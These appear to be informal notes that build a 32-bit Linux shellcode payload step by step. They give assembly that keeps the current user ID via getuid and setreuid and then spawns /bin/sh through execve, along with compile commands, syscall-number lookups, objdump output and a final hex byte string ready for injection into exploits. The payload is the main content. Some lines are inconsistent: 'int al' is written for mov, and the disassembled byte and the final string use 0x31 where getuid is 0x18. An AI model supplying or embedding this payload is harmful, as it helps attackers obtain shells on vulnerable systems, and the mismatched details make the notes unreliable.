.intel_syntax noprefix
.global main
main:
    //getuid
    xor eax, eax
    mov al, 0x18
    int 0x80

    //setreuid
    mov ebx, eax
    mov ecx, eax
    xor eax, eax
    mov al, 0x46
    int 0x80

    //arg3 : edx
    xor edx, edx

    //arg1 -> "/bin/sh"
    push edx
    push 0x68732f2f
    push 0x6e69622f    
    mov ebx, esp
    
    //arg2 -> ecx
    push edx
    push ebx
    mov ecx, esp

    //int
    xor eax, eax
    mov al, 0xb
    int 0x80

    
#compile
$gcc shell.s -o shell

#disassem execve
0x804d062 <__execve+22>:	mov    0xc(%ebp),%ecx
0x804d065 <__execve+25>:	mov    0x10(%ebp),%edx
0x804d068 <__execve+28>:	push   %ebx
0x804d069 <__execve+29>:	mov    %edi,%ebx
0x804d06b <__execve+31>:	mov    $0xb,%eax
0x804d070 <__execve+36>:	int    $0x80

sfp
ret
arg1 ;sfp+8 ebx
arg2 ;sfp+c ecx
arg3 :sfp+10 edx


#getuid ID
[gate@localhost tmp]$ cat /usr/src/linux-2.2.14/include/asm-i386/unistd.h | grep getuid
#define __NR_getuid		 24

xor eax, eax
int al, 0x18
int 0x80

#setuid ID
[gate@localhost tmp]$ cat /usr/src/linux-2.2.14/include/asm-i386/unistd.h | grep setreuid
#define __NR_setreuid		 70

mov ebx, eax
mov ecx, eax
xor eax, eax
int al, 0x46
int 0x80


#objdump
$objdump -x ./shell
 8048398:	31 c0                	xor    %eax,%eax
 804839a:	b0 18                	mov    $0x31,%al
 804839c:	cd 80                	int    $0x80
 804839e:	89 c3                	mov    %eax,%ebx
 80483a0:	89 c1                	mov    %eax,%ecx
 80483a2:	31 c0                	xor    %eax,%eax
 80483a4:	b0 46                	mov    $0x46,%al
 80483a6:	cd 80                	int    $0x80
 80483a8:	31 d2                	xor    %edx,%edx
 80483aa:	52                   	push   %edx
 80483ab:	68 2f 2f 73 68       	push   $0x68732f2f
 80483b0:	68 2f 62 69 6e       	push   $0x6e69622f
 80483b5:	89 e3                	mov    %esp,%ebx
 80483b7:	52                   	push   %edx
 80483b8:	53                   	push   %ebx
 80483b9:	89 e1                	mov    %esp,%ecx
 80483bb:	31 c0                	xor    %eax,%eax
 80483bd:	b0 0b                	mov    $0xb,%al
 80483bf:	cd 80                	int    $0x80


########################
\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80
########################



